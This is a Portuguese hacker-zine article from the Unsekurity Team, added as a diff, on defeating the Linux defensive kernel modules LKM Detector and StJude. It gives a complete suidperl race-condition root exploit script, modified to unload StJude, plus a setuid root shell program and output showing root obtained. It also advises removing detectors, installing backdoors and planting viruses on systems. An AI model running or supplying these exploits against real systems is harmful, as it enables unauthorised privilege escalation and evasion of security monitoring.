@@ -1,0 +1,706 @@
+############################################################################
+############################ UNSEKURITY TEAM ###############################
+############################################################################
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Estes e outros artigos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+
+
+OBS: O autor nao se responsabiliza pelo mau uso dos exemplos e dados aqui
+     fornecidos.Todo material contido neste arquivo texto possui somente
+     propositos educacionais.
+
+OBS2: Mais um Artigo onde o publico alvo eh o pessoal NewBie.Espero que
+      os 'elites' nao percam seu tempo lendo este simples artigo!
+
+
+		    --------------------------------
+		   |  PASSANDO POR LKMs DEFENSORES  |
+		    --------------------------------
+
+-------------------------------- INDICE ---------------------------------
+
+1. INTRODUCAO.
+2. LKMs DEFENSORES
+   2.1. - LKM Detector.
+   2.2. - SaintJude.
+3. TECNICAS FUCADORAS.
+   2.1. - Detonando LKM Detector.
+   2.2. - Detonando SaintJude.
+   2.3. - Problemas e Sugestoes
+4. TERMINANDO
+   4.1. - Links e Referencias.
+   4.2. - Consideracoes Finais.
+
+-------------------------------------------------------------------------
+
+--------------
+1. INTRODUCAO |
+--------------
+
+Vamos seguindo nesta jornada rumo a mais um desafio! Tentar demonstrar
+que nao soh eh possivel passar por algumas ferramentas LKMs Protetoras
+como tambem expandir os conceitos no intuito de torna-las inuteis.Veremos
+algumas tecnicas e teorias, mas caberah a voce, amigo fucador ir mais
+longe! Conhecimentos basicos de LKM se fazem necessarios, recomendo a
+leitura do 'Tutorial de Programacao Basica para Fucadores' item 5, C,
+e um bom conhecimento de Linux tambem. Mas os esquemas serao simples,
+apenas para que possamos contemplar maiores teorias e tecnicas para tentar
+derrubar estes conceitos, nao pretendo entrar em exploits especificos para
+'buffer overflows' pois tem um tutorial a caminho e lah eu devo abordar
+um pouco sobre Ferramentas IDS contra Buffer Overflows, talvez coloque
+algo sobre o SaintJude.Todos os esquemas aqui foram testados em Linux
+Slackware 7.0 - kernel 2.2.13.  
+
+-------------------
+2. LKMs DEFENSORES |
+-------------------
+
+Sao varios os Programas de Defesa que usam LKMs em sistemas linux, no 
+entanto eu vou me concentrar em apenas dois.Seus conceitos podem ser
+abrangidos em outros Programas do genero.
+
+2.1. - LKM Detector.
+---------------------
+
+LKM Detector eh um Modulo de Kernel Carregavel que nao faz outra coisa a
+nao ser detectar o carregamento de LKMs no sistema e avisar o administrador 
+que essas mudancas ocorreram.Isso representa um grande empecinho na
+instalacao de backdoors e redirecionadores de executaveis que usam LKM.
+Mas voce administrador iria confiar somente nisso??? Presta atencao quando
+alguem da Comunidade de Seguranca cita isso como uma boa ferramenta na
+prevencao de virus!!! Mas Vamos lah.. O codigo mais difundido dessa
+ferramenta segue abaixo:
+
+--------------------------- lkm_detector.c -------------------------------
+
+/* LKM Detector retirado do tutorial da The Hackers Choice sobre LKM.
+   http://www.infowar.co.uk/
+   Atualizado para kernel 2.2.13 by Nash Leon.
+   nashleon@yahoo.com.br/
+*/
+
+#define     MODULE
+#define   __KERNEL__
+
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/unistd.h>
+#include <asm/uaccess.h>
+#include <linux/dirent.h>
+#include <linux/malloc.h>
+#include <sys/syscall.h>
+
+extern void* sys_call_table[];
+
+int (*orig_create_module)(char*, unsigned long);
+
+int hacked_create_module(char *name, unsigned long size)
+{
+ char *kernel_name;
+ int ret;
+
+ kernel_name = (char*) kmalloc(256, GFP_KERNEL);
+ copy_from_user(kernel_name, name, 255);
+
+ /*here we log to syslog, but you can log where you want*/
+ printk("<1> SYS_CREATE_MODULE : %s\n", kernel_name);
+
+ ret=orig_create_module(name, size);
+ return ret;
+}
+
+int init_module(void)                /*module setup*/
+{
+ orig_create_module=sys_call_table[SYS_create_module];
+ sys_call_table[SYS_create_module]=hacked_create_module;
+ return 0;
+}
+
+void cleanup_module(void)            /*module shutdown*/
+{
+ sys_call_table[SYS_create_module]=orig_create_module;
+
+}
+-----------------------------------------------------------------------
+
+# gcc -c -O3 lkm_detector.c
+# insmod lkm_detector.o
+# lsmod
+Module                  Size  Used by
+lkm_detector             408   0  (unused)
+iBCS                  135456   0
+pcmcia_core            39080   0
+bsd_comp                3568   0
+ppp                    20428   0  [bsd_comp]
+slip                    7188   0  (unused)
+slhc                    4300   0  [ppp slip]
+lp                      5660   0  (unused)
+parport_pc              5588   1
+parport                 6724   1  [lp parport_pc]
+
+Aih estah o dito cujo.Se voce carregar um LKM verah o seguinte
+comportamento 'padrao':
+
+# insmod StJude_lkm.o
+ SYS_CREATE_MODULE : StJude_lkm
+Loading StJude-LKM 0.02 ... <1>Done.
+
+Ele acusa no prompt.. e se voce for ver no sistema de log:
+
+Aug  8 12:38:19 localhost kernel:  SYS_CREATE_MODULE : StJude_lkm
+
+Lah estah o dito cujo!! 
+
+# lsmod
+Module                  Size  Used by
+StJude_lkm             43396   0  (unused)
+lkm_detector             408   0  [StJude_lkm]
+
+Veja acima o comportamento dele apos o carregamento de um LKM qualquer. 
+
+2.2. - SaintJude.
+------------------
+
+O SaintJude eh um 'excelente' LKM.Ele intercepta varios systemcalls e
+tenta protege-los de forma eficiente.O Conceito usado neste 'Protetor'
+tem sido bastante discutido, pois pode ser que num futuro proximo ele
+venha a ser algo predominante na seguranca de Sistema Operacionais.
+Voce pode obte-lo no seguinte endereco:
+
+http://packetstorm.securify.com/linux/security/StJude_LKM-0.02.tar.gz
+
+Parece que ele foi um dos temas da Conferencia de "Hackers"(entre aspas)
+DefCon.Ele eh capaz de proteger de varias tecnicas usadas para se
+executar comandos como outro usuario, no entanto, ele pode ser facilmente
+'derrubado' em sua instalacao padrao.Veremos isso logo abaixo.
+
+----------------------
+3. TECNICAS FUCADORAS |
+----------------------
+
+Os esquemas que vou disponibilizar aqui sao simples.Apenas para que voce
+possa ir contemplando mais teorias e implementando novas tecnicas por sih
+soh.
+
+2.1. - Detonando LKM Detector
+------------------------------
+
+Como vimos no inicio, o comportamento 'padrao' do LKM detector nao faz
+outra coisa a nao ser avisar o administrador que um LKM foi carregado
+no sistema! Existe utilidade nisso??? Sim existe!! Isso pode ser usado
+para discussoes e desrespeito em mail lists!:)... Mas na pratica, nao
+eh um esquema eficiente! Veremos porque eu digo isso.
+
++ Derruba-lo simplesmente:
+
+Jah que voce tem root e ele nao eh um LKM stealth. Derrube-o!
+
+# lsmod
+Module                  Size  Used by
+lkm_detector             408   0
+iBCS                  135456   0
+pcmcia_core            39080   0
+bsd_comp                3568   0
+ppp                    20428   0  [bsd_comp]
+slip                    7188   0  (unused)
+slhc                    4300   0  [ppp slip]
+lp                      5660   0  (unused)
+parport_pc              5588   1
+parport                 6724   1  [lp parport_pc]
+
+# rmmod lkm_detector
+localhost:/crazy/progs/protect/StJude_LKM-0.02# lsmod
+Module                  Size  Used by
+iBCS                  135456   0
+pcmcia_core            39080   0
+bsd_comp                3568   0
+ppp                    20428   0  [bsd_comp]
+slip                    7188   0  (unused)
+slhc                    4300   0  [ppp slip]
+lp                      5660   0  (unused)
+parport_pc              5588   1
+parport                 6724   1  [lp parport_pc]
+
+Nada demais, nao???
+
++ Se ele for auto-carregavel e stealth, encontre-o e altere o sistema!
+
+O LKM sempre nos deixa algumas pistas para que o possamos encontrar.Tudo
+que necessitamos fazer eh 'uma vistoria' no sistema:
+
+  - Procurar em /etc/rc.d ;
+  - Procurar em arquivos de carregamento via inicializacao ;
+
+Mas procurar o que??
+
+Vamos analisar abaixo o nosso LKM Detector:
+
+# strings lkm_detector.o | more
+...
+orig_create_module
+...
+
+O que nos interessa eh isso acima.Encontrando isto temos uma chance enorme
+de descobrir o nome do LKM que estah manipulando o systemcall 'create_module'.
+Atraves de 'fingerprint' deixados pelo nosso LKM detector eh possivel
+que venhamos a acha-lo no sistema aonde quer que ele esteja, lembre-se:
+"NOS JAH SOMOS ROOT!!! O SISTEMA JAH EH NOSSO!!"
+
+Encontrando o arquivo, altere o carregamento(muitas vezes, basta comentar
+a linha) e reinicie o sistema!! Isso mesmo!!:).. Depois altere tudo que
+voce necessita(instala backdoor, compila tudo que tiver direito e se
+alguem xingar a sua voh, meta um virus no sistema dele!), depois traz o
+dito cujo ao normal!
+
+2.2. - Detonando SaintJude.
+----------------------------
+
+Passar por este programa requer um pouco de 'persistencia'.Irei descrever
+algumas tecnicas basicas que podem ajuda-lo nessa jornada.Voce deve
+expandir mais os conceitos e teorizar em cima disso tudo.
+
+2.2.1. - Detectando SaintJude
+------------------------------
+
+Em sua instalacao original atual, o SaintJude nao eh stealth. Voce pode
+detecta-lo com um simples:
+
+$ /sbin/lsmod
+Module                  Size  Used by
+StJude_lkm             43392   0  (unused) -> Olha ele aqui!!!!
+iBCS                  135456   0
+pcmcia_core            39080   0
+bsd_comp                3568   0
+ppp                    20428   0  [bsd_comp]
+slip                    7188   0  (unused)
+slhc                    4300   0  [ppp slip]
+lp                      5660   0  (unused)
+parport_pc              5588   1
+parport                 6724   1  [lp parport_pc]
+
+
+2.2.2. - Armas de Guerra
+--------------------------
+
+O SaintJude funciona atraves da interceptacao de systemcalls.Eh um
+programa bastante eficiente no que se refere as tecnicas basicas de 
+exploitacao amplamente conhecidas,logo, voce necessitarah de algo mais para 
+poder 'passar' por ele.Os systemcalls que ele intercepta sao os seguintes:
+
+__NR_setuid
+__NR_setreuid
+__NR_fork
+__NR_vfork
+__NR_clone
+__NR_exit
+__NR_execve
+
+__NR_create_module [ Usado no modo debugador ]
+__NR_delete_module [ Usado no modo debugador ]
+
+Os dois ultimos tornam nosso 'trabalho' bastante dificil, mas como nao eh
+recomendado o carregamento da LKM com esses dois 'interceptadores', pois
+a funcionalidade de um sistema que necessita carregar LKMs pode ser
+comprometida, nosso 'trabalho' eh entao mais facilitado!
+
+Se voce jah eh um fucador um pouco experiente em Sistemas Linux voce vai
+perceber logo de cara que ele intercepta varios SystemCalls importantes,
+mas existem outros.Voce poderia contemplar varios esquemas em cima dos
+outros systemcalls e poder tirar proveito deles.Mas eu vou descrever uma
+tecnica mais simples e verdadeiramente mais eficiente.
+
+2.2.3. - Passando por SaintJude
+--------------------------------
+
+Em sua instalacao padrao, a versao 0.02 pode ser exploitada permitindo
+a execucao de programas como se fosse outro usuario, ou seja, eh possivel
+passar pela protecao de setuid() dele.Vejamos como isso eh possivel.
+
+Abaixo segue um programa que executa uma shell com suid root:
+
+-------------------------------- shell.c ---------------------------------
+#include <stdio.h>
+#include <stdlib.h>
+
+main(){
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+---------------------------------------------------------------------------
+
+Compilando este programa como root e depois tornando-o suid root poderemos
+ver na pratica a eficiencia do SaintJude:
+
+# gcc -o shell shell.c
+# chmod 04755 shell
+# ls -l shell
+-rwsr-xr-x   1 root     root        11823 Aug  8 11:26 shell
+
++ Sem SaintJude teriamos:
+
+$ ./shell
+bash-2.03# id
+uid=0(root) gid=0(root) groups=100(users)
+
++ Com SaintJude:
+
+$ id
+uid=1000(nashleon) gid=100(users) groups=100(users)
+$ ./shell
+uid=1000(nashleon) gid=100(users) groups=100(users)
+
+Podemos notar que a copia de shell estah funcionando perfeitamente, mas o
+SaintJude tambem! Logo, a copia se torna 'quase' inutil!
+
+O Esquema mais simples de se passar por isto consiste em 'confundir' o
+SaintJude. Como assim confundir? O Programa suid root existe e por mais
+que o SaintJude queira interceptar e alterar 'seu fluxo', podemos
+perfeitamente se aproveitar da condicao em que a uid eh elevada e 'fugir'
+da previsao usada pelo SaintJude. Conhecendo o comportamento do LKM, voce
+estah apto a produzir esquemas diferenciados para exploitacao do mesmo.
+
+Recentemente foi descoberto um problema com o arquivo 'suidperl', usarei
+o exemplo do exploit criado pelo Michal Zalewski alterado por mim para
+demonstrar esse esquema:
+
+------------------------------- xperl.sh -----------------------------------
+#!/bin/bash
+#
+#    -- PLEASE READ THESE COMMENTS CAREFULLY BEFORE TRYING ANYTHING --
+#
+# Wonderful, lovely, world-smashing, exciting perl exploit. It works
+#against
+# +s suidperl, exploiting undocumented /bin/mail feature when perl wants
+#to
+# notify root on inode race conditions. Currently, tested under RH Linux.
+#
+# What's probably most shocking, buggy code has following comment inside:
+# /* heh, heh */. I guess author wasn't laughning last.
+#
+# Development history of this exploit is really funny. I found this
+#condition
+# about 4 months ago, but thought it's useless (who wants to notify
+#root?).
+# I deleted my test code and didn't left any notes on it. Then, month
+#after
+# this discovery, Sebastian contacted me. He was working on perl exploit.
+# He told me he don't know how to cause this condition to happen, but
+# if he realise how he can do it, he'll be able to use undocumented
+#/bin/mail
+# feature - environmental variable 'interactive', which, if set, causes
+# /bin/mail to interpret ~! commands (subshell requests) even if stdin is
+#not
+# on terminal. And then I understood what I've done. I spent next month
+# (yes! no kidding!) trying to recall what the fsck was the condition. I
+# remembered it was trivial, even annoying... And finally, now I'm able to
+# reconstruct it.
+#
+# This exploit tries to fit in rather short, but reasonable time window in
+# order to exploit it. I tested it on fast, not overloaded Linux box, and
+# I guess on slow machines it needs tunning. It needs anything setuid
+# (/usr/bin/passwd is just fine), writable working directory and something
+# around 4 minutes. Working directory should be mounted without noexec or
+# nosuid options (if so, find something like /var/lib/svgalib etc).
+#
+# WARNING: On slow machines, it's quite possible this exploit will cause
+# heavy load. Please test it when system is not overloaded and not used
+# (eg. at night).
+#
+#
+# I'd like to thank Sebastian Krahmer for his help (in fact, HE discovered
+# it
+# - I think I can say it without shame), and especially thank to several
+# of
+# my braincells that survived monitor radiation and made me recall this
+# race condition.
+#
+# Send comments, ideas and flames to <lcamtuf@ids.pl>
+# Tested with sperl 5.00503, but should work with any other as well.
+#
+# Good luck and don't abuse it.
+#
+
+clear
+
+
+echo "Suidperl 5.00503 (and newer) root exploit"
+echo "-----------------------------------------"
+echo "Written by Michal Zalewski <lcamtuf@dione.ids.pl>"
+echo "With great respect to Sebastian Krahmer..."
+echo
+
+SUIDBIN=/usr/bin/passwd
+
+echo "[*] Usando suidperl=$SUIDPERL, suidbin=$SUIDBIN..."
+
+if [ ! -u $SUIDPERL ]; then
+  echo "[-] Sorry, $SUIDPERL4 is NOT setuid on this system or"
+  echo "    does not exist at all. If there's +s perl binary available,"
+  echo "    please change SUIDPERL variable within exploit code."
+  echo
+  exit 0
+fi
+
+if [ ! -u $SUIDBIN ]; then
+  echo "[-] Sorry, $SUIDBIN is NOT setuid on this system or does not exist at"
+  echo "    all. Please pick any other +s binary and change SUIDBIN variable"
+  echo "    within exploit code."
+  echo
+  exit 0
+fi
+
+echo "[+] Checks passed, compiling flares and helper applications..."
+echo
+
+cat >flare <<__eof__
+#!/usr/bin/suidperl
+
+print "Nada pode me parar agora...\n"; # :)
+
+__eof__
+
+cat >bighole.c <<__eof__
+#include <stdlib.h>
+main() {
+  setuid(0);
+  setgid(0);
+  chown("sush",0,0);
+  chmod("sush",04755);
+  system("/sbin/rmmod StJude_lkm"); #Olha essa Linha Aqui!!!!!!!!
+}
+__eof__
+
+cat >sush.c <<__eof__
+main() {
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
+}
+__eof__
+
+make bighole sush
+
+echo
+
+if [ ! -x ./sush ]; then
+echo "[-] Oops, seems to me I cannot compile helper applications. Either"
+echo "    you don't have working 'make' or 'gcc' utility. If possible,"
+echo "    please compile bighole.c and sush.c manually (to bighole and sush)."  
+echo
+exit 0
+fi
+
+echo "[+] Setting up environment..."
+
+chmod 4755 ./flare
+
+FILENAME='none
+
+~!bighole
+
+'
+export interactive=1
+PATH=.:$PATH
+
+echo "[+] Starting exploit. It could take up to 5 minutes in order to get"
+echo "[+] working root shell. WARNING - WARNING - WARNING: it could cause"
+echo "[+] heavy system load."
+
+while :; do
+  ( ln -f -s $SUIDBIN "$FILENAME";usleep $RANDOM; nice -n +20 $SUIDPERL
+./"$FILENAME" <./flare & ) &>/dev/null &
+  ( usleep $RANDOM ; ln -f -s /dev/stdin "$FILENAME" ) &>/dev/null &
+  if [ -u ./sush ]; then
+    echo
+    echo "[+] Arquivo suid criado com Sucesso..."
+    echo
+    rm -f "$FILENAME" sush.c bighole bighole.c flare
+    ./sush
+    echo
+    echo "[+] Thank you for using Marchew Industries / dupa.ryba products."
+    echo
+    rm -f "$FILENAME" sush.c bighole bighole.c flare sush
+    exit 0
+  fi
+done
+----------------------------------------------------------------------------
+
+Vamos lah:
+
++ Como root:
+
+# insmod StJude_lkm.o
+Loading StJude-LKM 0.02 ... <1>Done.
+# lsmod
+Module                  Size  Used by
+StJude_lkm             43392   0  (unused)
+iBCS                  135456   0
+pcmcia_core            39080   0
+bsd_comp                3568   0
+ppp                    20428   0  [bsd_comp]
+slip                    7188   0  (unused)
+slhc                    4300   0  [ppp slip]
+lp                      5660   0  (unused)
+parport_pc              5588   1
+parport                 6724   1  [lp parport_pc]
+
++ Como usuario comum:
+
+$ id
+uid=1000(nashleon) gid=100(users) groups=100(users)
+$ ./xperl.sh
+Suidperl 5.00503 (and newer) root exploit
+-----------------------------------------
+Written by Michal Zalewski <lcamtuf@dione.ids.pl>
+With great respect to Sebastian Krahmer...
+
+[*] Usando suidperl=/usr/bin/suidperl, suidbin=/usr/bin/passwd...
+[+] Checks passed, compiling flares and helper applications...
+
+cc     bighole.c   -o bighole
+cc     sush.c   -o sush
+
+[+] Setting up environment...
+[+] Starting exploit. It could take up to 5 minutes in order to get
+[+] working root shell. WARNING - WARNING - WARNING: it could cause
+[+] heavy system load.
+
+[+] Arquivo suid criado com Sucesso...
+
+
+[+] Thank you for using Marchew Industries / dupa.ryba products.
+
+rm: cannot unlink `sush': Operation not permitted
+
+Nao deu de primeira, mas...
+
+$ /sbin/lsmod
+Module                  Size  Used by
+iBCS                  135456   0
+pcmcia_core            39080   0
+bsd_comp                3568   0
+ppp                    20428   0  [bsd_comp]
+slip                    7188   0  (unused)
+slhc                    4300   0  [ppp slip]
+lp                      5660   0  (unused)
+parport_pc              5588   1
+parport                 6724   1  [lp parport_pc]
+
+Jah nao existe mais SaintJude... logo, tudo que precisamos fazer eh
+checar se criou o suid:
+
+$ ls -l sush
+-rwsr-xr-x   1 root     root        11822 Aug  8 15:12 sush*
+$ ./sush
+bash-2.03# id 
+uid=0(root) gid=0(root) groups=100(users)
+bash-2.03# exit
+exit
+
+Como voce pode perceber funciona perfeitamente! Voce pode notar tambem que
+a unica coisa que eu fiz de util nesse exploit foi acrescentar a seguinte
+linha:
+
+  system("/sbin/rmmod StJude_lkm");
+
+Ela eh a responsavel por derrubar o LKM.Agora contemple voce mesmo o
+esquema... Quem executou isso foi o daemon e nao voce.. logo eh
+perfeitamente possivel usar implementacoes em programas bugados com
+system(), popen() e ateh mesmo buffer overflows! Enfim, se existe um
+programa suid existe a condicao de execucao do mesmo como dono do usuario!
+O conceito de suid eh justamente este, logo, existem esquemas para se
+passar por isto! Vah fundo e voce irah contemplar mais!
+
+2.3. - Problemas e Sugestoes
+------------------------------
+
+Um LKM eh um desafio a mais e deve ser sempre levado em consideracao
+quando se 'luta' contra a 'pseudo-seguranca' de um sistema.Muitos problemas
+podem surgir como alguns descritos abaixo: 
+
+* LKM stealth;
+* IDS Contra Overflow;
+* Bom Sistema de Log;
+* Permissoes Bem Caracterizadas;
+
+Enfim, varios sao os desafios!! Mas soh depende de voce seguir persistindo
+que voce conseguirah passar por cada um desses desafios! Uma vez obtido
+acesso local, as opcoes para obtencao de 'root' sao consideraveis, basta
+voce estar disposto e ir atras! Acredite em voce mesmo! Respeite o
+administrador, mas procure olhar a maquina, na maioria das vezes voce nao
+estah lutando contra um administrador e sim contra programas!! Softwares
+que foram feitos por humanos e sempre estarao a merce de falhas!!! Basta
+ir de encontro aos conceitos usados por estes Softwares e voce serah
+bem sucedido!!
+
+--------------
+4. TERMINANDO |
+--------------
+
+Aih estah mais um simples esquema demonstrando que eh possivel 'passar'
+por mais uma ferramentas usada e difundidas pela comunidade de seguranca.
+Existem muitos outros esquemas para passar por esses conceitos e eu vou
+disponibiliza-los em breve.O que fica mais uma vez evidenciado eh que se
+algum administrador de rede acha que a solucao para os problemas estah
+em se usar Softwares que procuram 'sanar' os problemas externamente(sem
+atingir a causa dos problemas), esse administrador estah completamente
+enganado!!! Grande parte da Comunidade de Seguranca defende um conceito
+que as ferramentas sao capazes de eliminar tecnicas!! Eu nao penso assim!
+Abram os olhos e contemplem voces mesmos a realidade!
+Para o fucador, a necessidade de ir mais fundo eh evidente e realmente
+muito gratificante!! Essas ferramentas representam um desafio a mais, mas
+que podem sim serem 'transpassadas'.Estude e vah fundo e voce verah que
+a grande maioria das Ferramentas usadas pela Comunidade de Segurancao nao
+fazem o que elas dizem fazer!
+
+4.1. - Links e Referencias
+---------------------------
+
+* Sobre LKM Detector:
+
+http://www.infowar.co.uk/thc/ -> Procure em Articles.
+
+* Sobre SaintJude:
+
+http://packetstorm.securify.com/linux/security/StJude_LKM-0.02.
+
+* Home Page do Unsekurity Team:
+
+http://unsekurity.virtualave.net/
+
+* Outros Links Muito Interessantes:
+
+http://www.bufferoverflow.org/
+http://www.taldowin.com.br/
+http://www.absoluta.org/
+http://www.securenet.com.br/
+
+4.2. - Consideracoes Finais
+----------------------------
+
+Eh de admirar e ateh mesmo assustar o crescimento que o Unsekurity Team
+vem obtendo.Temos trabalhado duro para isso, e mais material estah a
+caminho.Em breve iremos expandir mais e mais conceitos e tecnicas, mas
+tudo no seu devido tempo.Muita gente anda descontente com o 'trabalho'
+que estamos realizando, mas existe um porque muito forte para darmos
+sequencia ao que estamos comecando! 
+Gostaria de agradecer ao pessoal do Unsekurity Team e a todos aqueles que
+estao acompanhando as nossas publicacoes... Tambem ao pessoal que assinou
+a nossa Mail List e que vem discutindo varios assuntos de interesse de
+fucadores.. Ao pessoal que nos tem criticado, acho valido isso tudo e
+se as criticas sao construtivas, temos mais eh que acata-las e nao
+ataca-las.. Existe espaco para todos na NET, e defender a liberdade de
+expressao tem sido uma das minhas bandeiras, logo, muita gente anda
+incomodado quanto a isso!! Seja critico irmao!!
+
+Um abraco.
+
+						Nash Leon
+
+--------------------------------- EOF ------------------------------------
